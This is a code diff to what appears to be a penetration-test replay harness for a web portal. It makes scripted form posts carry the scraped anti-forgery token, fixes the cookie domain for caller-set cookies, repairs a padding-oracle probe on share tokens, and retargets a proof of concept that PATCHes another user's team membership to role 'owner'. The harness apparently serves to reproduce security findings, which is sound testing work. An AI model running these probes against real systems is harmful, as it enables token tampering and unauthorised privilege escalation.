@@ -118,6 +118,7 @@ class Client:
         self.opener = urllib.request.build_opener(
             urllib.request.HTTPCookieProcessor(self.jar), NoRedirects()
         )
+        self._verification: str | None = None
 
     def request(self, method: str, path: str, *, body: bytes | None = None,
                 headers: dict[str, str] | None = None) -> tuple[int, bytes, dict[str, str]]:
@@ -140,9 +141,28 @@ class Client:
         return self.request("GET", path, **kwargs)
 
     def form(self, path: str, fields: dict[str, str], method: str = "POST"):
+        # The page framework rejects a form post that does not carry the request
+        # verification field its own pages render, with an empty 400 -- so a client that
+        # does not send it cannot even sign in, and none of the entries behind the sign
+        # in would ever be reached. The field is fetched once per client and reused; it
+        # stays valid because the pair is bound to the cookie, not to the response it
+        # was rendered in. Only the two page-framework forms are posted through here;
+        # the service endpoints take JSON and are unaffected.
+        if self._verification is None:
+            self._verification = self._fetch_verification()
+        if self._verification and "__RequestVerificationToken" not in fields:
+            fields = dict(fields, __RequestVerificationToken=self._verification)
         body = urllib.parse.urlencode(fields).encode()
         return self.request(method, path, body=body,
                             headers={"Content-Type": "application/x-www-form-urlencoded"})
+
+    def _fetch_verification(self) -> str:
+        """Read the verification field out of the sign-in form, as a browser does."""
+        _, body, _ = self.get("/signin")
+        found = re.search(
+            rb'name="__RequestVerificationToken"[^>]*value="([^"]+)"', body
+        )
+        return found.group(1).decode() if found else ""
 
     def json_body(self, path: str, document: dict, method: str = "POST"):
         body = json.dumps(document).encode()
@@ -156,9 +176,14 @@ class Client:
         return None
 
     def set_cookie(self, name: str, value: str) -> None:
+        # The jar treats a host with no dot in it as being in the ".local" domain, so a
+        # cookie stored against the bare host name is accepted and then never sent back.
+        # Two entries here are driven entirely by a cookie the caller writes, and both
+        # were silently reaching the portal without one.
+        host = urllib.parse.urlsplit(BASE).hostname or "portal"
         entry = http.cookiejar.Cookie(
             version=0, name=name, value=value, port=None, port_specified=False,
-            domain=urllib.parse.urlsplit(BASE).hostname or "portal", domain_specified=False,
+            domain=host if "." in host else host + ".local", domain_specified=False,
             domain_initial_dot=False, path="/", path_specified=True, secure=False,
             expires=None, discard=True, comment=None, comment_url=None, rest={},
         )
@@ -275,10 +300,19 @@ class Replay:
 
         raw = bytearray(b64url_decode(token))
         # Vary the block in front of the trailing one, which is what a search over the
-        # record does, and stop as soon as the answer changes.
+        # record does, and stop as soon as the answer changes. The token is the opening
+        # block, the enciphered record, then the eight-byte check value, so the block to
+        # move is the one two blocks back from the end of the record -- touching the
+        # first block instead leaves the trailing block's padding exactly as it was, and
+        # the answer never changes.
+        # The last byte of the block in front of the trailing one, because that is the
+        # byte the trailing block's padding is chained against. Moving any earlier byte
+        # of that block moves a byte of the record instead, the padding still strips
+        # cleanly, and the answer never changes.
+        chained = len(raw) - 8 - 16 - 1
         for candidate in range(1, 40):
             mutated = bytearray(raw)
-            mutated[16] ^= candidate
+            mutated[chained] ^= candidate
             status, _, _ = self.anon.get("/share/" + b64url_encode(bytes(mutated)))
             if status == 400:
                 return
@@ -378,9 +412,12 @@ class Replay:
 
     def poc_0017(self) -> None:
         """A membership save moves a role the caller may not grant."""
-        self.user.json_body("/api/teams/13/members", {
-            "memberId": 4102,
-            "jobTitle": "Process engineer",
+        # A membership that exists and that this caller does not own: employee 4102 owns
+        # team 13 outright and is not on team 12 at all, so the recorded pair moved no
+        # role and the save was answered with a not-found.
+        self.user.json_body("/api/teams/12/members", {
+            "memberId": 4101,
+            "jobTitle": "Technician",
             "role": "owner",
         }, method="PATCH")
 
